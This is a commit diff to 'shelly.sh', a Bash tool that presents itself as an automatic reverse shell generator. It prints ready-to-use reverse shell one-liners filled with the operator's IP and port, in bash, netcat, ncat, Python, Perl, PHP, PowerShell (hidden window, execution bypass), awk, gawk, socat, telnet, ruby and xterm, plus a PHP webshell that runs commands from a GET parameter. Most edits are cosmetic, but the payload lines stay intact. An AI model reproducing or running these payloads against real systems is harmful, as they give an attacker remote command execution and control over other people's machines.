c915c693a03de765a7a8c9451359ca0987dfdb79
Miguel R <d4t4s3c@protonmail.com>
2021-10-15 11:28:55 +0200

    UPDATE

--- shelly.sh
+++ shelly.sh
@@ -34,37 +34,38 @@ declare -r f22='Php'
 declare -r f23='Awk'
 declare -r f24='Xterm'
 declare -r f25='Gawk'
-declare -r f26='==============================================================='
+declare -r f26='[===========================================]'
 declare -r f27='Webshell'
-declare -r f28=''
-declare -r f29='Automatic Reverse Shell Generator'
+declare -r f28='Example:'
+declare -r f29='>> Automatic Reverse Shell Generator <<'
+declare -r f30='shelly'
+declare -r f31='[=============================================('
+declare -r f32=')=============================================]'
 declare -r int="$1"
 declare -r lp="$2"
 declare -r def="$3"
-declare -r lh=$(/usr/bin/ip -4 address show $int | grep 'inet' | awk '{print $2}' | cut -d/ -f 1)
+declare -r lh=$(/usr/bin/ip -4 address show $int | /usr/bin/grep 'inet' | /usr/bin/awk '{print $2}' | /usr/bin/cut -d/ -f 1)
 
 function banner(){
 	echo ""	
-	echo -e "$White$f26                                            $End";	
 	echo -e "$CyanLight   _________.__           .__  .__          $End";
 	echo -e "$CyanLight  /   _____/|  |__   ____ |  | |  | ___.__. $End";
 	echo -e "$CyanLight  \_____  \ |  |  \_/ __ \|  | |  |<   |  | $End";
 	echo -e "$CyanLight  /        \|   Y  \  ___/|  |_|  |_\___  | $End";
 	echo -e "$CyanLight /_______  /|___|  /\___  >____/____/ ____| $End";
 	echo -e "$CyanLight         \/      \/     \/          \/      $End";
-	echo -e "$GreenLight     $f29                                  $End";
-	echo -e "$White$f26                                            $End";
+	echo -e "$GreenLight  $f29                                     $End";
+	echo -e "$RedLight$f26                                         $End";
 }
 
 function main(){
 	echo ""
-	echo -e "$White$f1$RedLight$f6$White$f2$GreenLight Author:$RedLight   d4t4s3c$End"
-   	echo -e "$White$f1$YellowLight$f3$White$f2$GreenLight Example:$YellowLight  shelly $RedLight$f4$White$f10$RedLight$f5 $RedLight$f4$White$f11$RedLight$f5 $RedLight$f4$White$f9$RedLight$f5$End"
+   	echo -e "$White$f1$YellowLight$f3$White$f2 $GreenLight$f28 $YellowLight$f30 $RedLight$f4$White$f10$RedLight$f5 $RedLight$f4$White$f11$RedLight$f5 $RedLight$f4$White$f9$RedLight$f5$End"
     	echo ""
 }
 
 if [ ! -z $int ]; then
-	sleep 0.5
+		:
 else
 	banner
     	main
@@ -72,7 +73,7 @@ else
 fi
 
 if [ ! -z $lp ]; then
-    	sleep 0.5
+		:
 else
 	banner
     	main
@@ -89,7 +90,7 @@ fi
 
 function bash(){
 	echo ""
-	echo -e "$White$f1$RedLight$f6$White$f2 $GreenLight$f12$End"
+	echo -e "$RedLight$f31$GreenLight$f12$RedLight$f32$End"
 	echo ""
 	echo -e "\tbash -i >& /dev/tcp/$lh/$lp 0>&1"
 	echo ""
@@ -103,7 +104,7 @@ function bash(){
 
 function netcat(){
 	echo ""
-	echo -e "$White$f1$RedLight$f6$White$f2 $GreenLight$f13$End"
+	echo -e "$RedLight$f31$GreenLight$f13$RedLight$f32$End"
 	echo ""
 	echo -e "\tnc -e /bin/sh $lh $lp"
 	echo ""
@@ -123,11 +124,9 @@ function netcat(){
 
 function php(){
 	echo ""
-	echo -e "$White$f1$RedLight$f6$White$f2 $GreenLight$f22$End"
+	echo -e "$RedLight$f31$GreenLight$f22$RedLight$f32$End"
 	echo ""
 	echo -e "\t<?php passthru('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lh $lp >/tmp/f'); ?>"
-	echo ""
-	echo -e "$White$f1$RedLight$f6$White$f2 $GreenLight$f27$End"
 	echo ""
 	echo -e "\t<?php system(\$_GET['cmd']); ?>"
 	echo ""
@@ -137,7 +136,7 @@ function php(){
 
 function ncat(){
 	echo ""
-	echo -e "$White$f1$RedLight$f6$White$f2 $GreenLight$f16$End"
+	echo -e "$RedLight$f31$GreenLight$f16$RedLight$f32$End"
 	echo ""
 	echo -e "\tncat $lh $lp -e /bin/sh"
 	echo ""
@@ -146,7 +145,7 @@ function ncat(){
 
 function xterm(){
 	echo ""
-	echo -e "$White$f1$RedLight$f6$White$f2 $GreenLight$f24$End"
+	echo -e "$RedLight$f31$GreenLight$f24$RedLight$f32$End"
 	echo ""
 	echo -e "\txterm -display $lh:$lp"
 	echo ""
@@ -154,13 +153,13 @@ function xterm(){
 
 function python(){
 	echo ""
-    	echo -e "$White$f1$RedLight$f6$White$f2 $GreenLight$f14$End"
-    	echo ""
+	echo -e "$RedLight$f31$GreenLight$f14$RedLight$f32$End"
+	echo ""
     	echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lh",$lp));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
     	echo ""
     	echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lh",$lp));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'"
     	echo ""
-    	echo -e "$White$f1$RedLight$f6$White$f2 $GreenLight$f15$End"
+    	echo -e "$RedLight$f31$GreenLight$f15$RedLight$f32$End"
     	echo ""
     	echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lh",$lp));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
     	echo ""
@@ -170,18 +169,17 @@ function python(){
 
 function perl(){
 	echo ""
-	echo -e "$White$f1$RedLight$f6$White$f2 $GreenLight$f19$End"
+	echo -e "$RedLight$f31$GreenLight$f19$RedLight$f32$End"
 	echo ""
 	echo "perl -e 'use Socket;\$i="\$lh";\$p=\$lp;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,"\>\&S");open(STDOUT,"\>\&S");open(STDERR,"\>\&S");exec("/bin/sh -i");};'"
 	echo ""
 	echo "perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,"$lh:$lp");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;'"
 	echo ""
-
 }
 
 function telnet(){
 	echo ""
-	echo -e "$White$f1$RedLight$f6$White$f2 $GreenLight$f21$End"
+	echo -e "$RedLight$f31$GreenLight$f21$RedLight$f32$End"
 	echo ""
 	echo -e "\trm -f /tmp/p; mknod /tmp/p p && telnet $lh $lp 0/tmp/p"
 	echo ""
@@ -191,7 +189,7 @@ function telnet(){
 
 function powershell(){
 	echo ""
-	echo -e "$White$f1$RedLight$f6$White$f2 $GreenLight$f18$End"
+	echo -e "$RedLight$f31$GreenLight$f18$RedLight$f32$End"
 	echo ""
 	echo "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("$lh",$lp);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + "PS " + (pwd).Path + "\> ";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
 	echo ""
@@ -203,7 +201,7 @@ function powershell(){
 
 function awk(){
 	echo ""
-	echo -e "$White$f1$RedLight$f6$White$f2 $GreenLight$f23$End"
+	echo -e "$RedLight$f31$GreenLight$f23$RedLight$f32$End"
 	echo ""
 	echo "awk 'BEGIN {s = '/inet/tcp/0/$lh/$lp'; while(42) { do{ printf 'shell>' |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print \$0 |& s; close(c); } } while(c != 'exit') close(s); }}' /dev/null"
 	echo ""
@@ -211,7 +209,7 @@ function awk(){
 
 function gawk(){
 	echo ""
-	echo -e "$White$f1$RedLight$f6$White$f2 $GreenLight$f25$End"
+	echo -e "$RedLight$f31$GreenLight$f25$RedLight$f32$End"
 	echo ""
 	echo "gawk 'BEGIN {P=$lp;S="\> ";H="$lh";V="/inet/tcp/0/"H"/"P;while(1){do{printf S|&V;V|&getline c;if(c){while((c|&getline)>0)print $0|&V;close(c)}}while(c!="exit")close(V)}}'"
 	echo ""
@@ -219,7 +217,7 @@ function gawk(){
 
 function socat(){
 	echo ""
-	echo -e "$White$f1$RedLight$f6$White$f2 $GreenLight$f20$End"
+	echo -e "$RedLight$f31$GreenLight$f20$RedLight$f32$End"
 	echo ""
 	echo -e "\tsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$lh:$lh,forever &"
 	echo ""
@@ -227,72 +225,45 @@ function socat(){
 
 function ruby(){
 	echo ""
-	echo -e "$White$f1$RedLight$f6$White$f2 $GreenLight$f17$End"
+	echo -e "$RedLight$f31$GreenLight$f17$RedLight$f32$End"
 	echo ""
-	echo -e "\truby -rsocket -e 'exit if fork;c=TCPSocket.new("$lh","$lp");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'"
+	echo -e "\truby -rsocket -e 'exit if fork;c=TCPSocket.new("$lh","$lp");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}$end'"
 	echo ""
 	echo -e "\truby -rsocket -e'f=TCPSocket.open("$lh",$lp).to_i;exec sprintf("/bin/sh -i \<\&%d \>\&%d 2\>\&%d",f,f,f)'"
+	echo ""
 }
 
 function start(){
-		echo ""
-		echo -e "$White$f26$End"
 	if [ "$def" == "bash" ] || [ "$def" == "Bash" ]; then
 		bash
-		echo ""
-		echo -e "$White$f26$End"
 	elif [ "$def" == "netcat" ] || [ "$def" == "Netcat" ]; then
 		netcat
-		echo ""
-		echo -e "$White$f26$End"
 	elif [ "$def" == "php" ] || [ "$def" == "Php" ]; then
 		php
-		echo ""
-		echo -e "$White$f26$End"
 	elif [ "$def" == "ncat" ] || [ "$def" == "Ncat" ]; then
 		ncat
-		echo ""
-		echo -e "$White$f26$End"
 	elif [ "$def" == "python" ] || [ "$def" == "Python" ] || [ "$def" == "python3" ] || [ "$def" == "Python3" ]; then
 		python
-		echo ""
-		echo -e "$White$f26$End"
 	elif [ "$def" == "perl" ] || [ "$def" == "Perl" ]; then
 		perl
-		echo ""
-		echo -e "$White$f26$End"
 	elif [ "$def" == "telnet" ] || [ "$def" == "Telnet" ]; then
 		telnet
-		echo ""
-		echo -e "$White$f26$End"
 	elif [ "$def" == "powershell" ] || [ "$def" == "PowerShell" ]; then
 		powershell
-		echo ""
-		echo -e "$White$f26$End"
 	elif [ "$def" == "awk" ] || [ "$def" == "Awk" ]; then
 		awk
-		echo ""
-		echo -e "$White$f26$End"
 	elif [ "$def" == "gawk" ] || [ "$def" == "Gawk" ]; then
 		gawk
-		echo ""
-		echo -e "$White$f26$End"
 	elif [ "$def" == "socat" ] || [ "$def" == "Socat" ]; then
 		socat
-		echo ""
-		echo -e "$White$f26$End"
 	elif [ "$def" == "ruby" ] || [ "$def" == "Ruby" ]; then
 		ruby
-		echo ""
-		echo -e "$White$f26$End"
 	elif [ "$def" == "xterm" ] || [ "$def" == "Xterm" ]; then
 		xterm
-		echo ""
-		echo -e "$White$f26$End"
     	else
  		banner
-    		main
-    		exit 0
+    	main
+    	exit 0
     	fi
 }
 
